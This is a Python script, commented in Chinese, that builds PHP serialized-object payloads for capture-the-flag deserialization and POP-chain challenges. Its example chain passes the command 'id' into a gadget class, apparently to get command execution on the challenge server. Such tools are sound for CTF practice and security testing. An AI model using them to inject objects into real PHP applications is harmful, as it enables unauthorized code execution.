# -*- coding: utf-8 -*-
"""
php_ser_builder.py —— PHP 序列化 payload 生成器（反序列化题通用）
===============================================================
适用：PHP 反序列化/POP 链题，需要手搓序列化字符串时。
用法：
    python php_ser_builder.py <spec.json>     # 输出序列化字符串
    python php_ser_builder.py --example        # 打印示例 spec（qsnctf wo/shi/Demo 链）
    python php_ser_builder.py spec.json --urlencode

spec.json 格式（嵌套对象）：
{
  "class": "wo",
  "props": {
    "sex": "boy",
    "age": "eighteen",
    "intention": {
      "class": "shi",
      "props": {
        "next": {"class": "Demo", "props": {"a": null}},
        "pass": "id"
      }
    }
  }
}
支持的值类型：字符串 / 数字 / null / true,false / 数组 / 嵌套对象（public 属性）。
"""
import json
import sys
import urllib.parse


def php_str(s):
    return 's:%d:"%s";' % (len(s), s)


def php_serialize(v):
    """把 Python 值转成 PHP 序列化片段"""
    if v is None:
        return "N;"
    if v is True:
        return "b:1;"
    if v is False:
        return "b:0;"
    if isinstance(v, int):
        return "i:%d;" % v
    if isinstance(v, str):
        return php_str(v)
    if isinstance(v, list):
        out = "a:%d:{" % len(v)
        for i, item in enumerate(v):
            out += php_serialize(i) + php_serialize(item)
        return out + "}"
    if isinstance(v, dict):
        if "class" in v:  # 对象规格
            return php_obj(v)
        # 普通关联数组
        out = "a:%d:{" % len(v)
        for k, val in v.items():
            out += php_str(k) + php_serialize(val)
        return out + "}"
    raise ValueError("不支持的类型: %r" % type(v))


def php_obj(spec):
    """按规格生成对象：{"class": "Name", "props": {...}}"""
    cls = spec["class"]
    props = spec.get("props", {})
    inner = "".join(php_str(k) + php_serialize(v) for k, v in props.items())
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props), inner)


def main():
    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)
    if sys.argv[1] == "--example":
        spec = {
            "class": "wo",
            "props": {
                "sex": "boy",
                "age": "eighteen",
                "intention": {
                    "class": "shi",
                    "props": {
                        "next": {"class": "Demo", "props": {"a": None}},
                        "pass": "id"
                    }
                }
            }
        }
        print(json.dumps(spec, ensure_ascii=False, indent=2))
        sys.exit(0)
    spec = json.load(open(sys.argv[1], encoding="utf-8"))
    payload = php_serialize(spec)
    print(payload)
    if "--urlencode" in sys.argv:
        print("\nURL 编码版：\n" + urllib.parse.quote(payload))


if __name__ == "__main__":
    main()
    print("\n按任意键退出...")
    try:
        input()
    except EOFError:
        pass
